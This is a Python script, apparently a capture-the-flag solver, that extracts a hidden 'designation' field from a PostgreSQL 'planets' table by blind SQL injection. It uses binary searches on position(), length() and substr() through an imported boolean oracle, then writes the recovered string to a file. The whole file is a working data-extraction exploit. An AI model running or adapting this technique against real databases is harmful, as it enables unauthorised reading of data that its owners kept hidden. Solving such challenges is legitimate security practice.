"""Targeted extraction: pull only the designation field out of the hidden row.

Row text looks like (f1,f2,f3,f4). Two cheap binary searches over `position()` give the
comma offsets, so only the designation itself has to be read character by character --
about a quarter of the cost of dumping all 59 characters.
"""
import sys
import time
from cmdexec import bit

GAP = 2.0
FLAGSET = list("abcdefghijklmnopqrstuvwxyz0123456789_{}-.")
NOT_KNOWN = ("NOT (planets::text LIKE '%MERCURY%' OR planets::text LIKE '%EARTH%' "
             "OR planets::text LIKE '%MARS%' OR planets::text LIKE '%JUPITER%' "
             "OR planets::text LIKE '%SATURN%' OR planets::text LIKE '%URANUS%' "
             "OR planets::text LIKE '%NEPTUNE%')")
UNK = "(SELECT planets::text FROM planets WHERE %s LIMIT 1)" % NOT_KNOWN


def get_int(expr, lo, hi):
    while lo < hi:
        mid = (lo + hi + 1) // 2
        time.sleep(GAP)
        if bit("(%s)>=%d" % (expr, mid)):
            lo = mid
        else:
            hi = mid - 1
    return lo


def one_char(expr, i, cands=FLAGSET):
    cands = list(cands)
    while len(cands) > 1:
        half = cands[:len(cands) // 2]
        inlist = ",".join("'" + c.replace("'", "''") + "'" for c in half)
        time.sleep(GAP)
        if bit("(SELECT substr((%s),%d,1)) IN (%s)" % (expr, i, inlist)):
            cands = half
        else:
            cands = cands[len(half):]
    return cands[0]


t0 = time.time()
p1 = get_int("position(',' in (%s))" % UNK, 0, 40)
print("[*] first comma at %d  (%.0fs)" % (p1, time.time() - t0), flush=True)
p2 = p1 + get_int("position(',' in substr((%s),%d))" % (UNK, p1 + 1), 0, 40)
print("[*] second comma at %d -> designation is chars %d..%d" % (p2, p1 + 1, p2 - 1), flush=True)

DES = "(SELECT substr(planets::text,%d,%d) FROM planets WHERE %s LIMIT 1)" % (p1 + 1, p2 - p1 - 1, NOT_KNOWN)
n = get_int("length((%s))" % DES, 0, 40)
print("[*] designation length %d" % n, flush=True)

out = []
for i in range(1, n + 1):
    out.append(one_char(DES, i))
    sys.stdout.write("\r[%d/%d] %s" % (i, n, "".join(out)))
    sys.stdout.flush()
    time.sleep(GAP)
print("\n[+] designation = %r  (%.0fs)" % ("".join(out), time.time() - t0), flush=True)
open("designation.txt", "w").write("".join(out) + "\n")
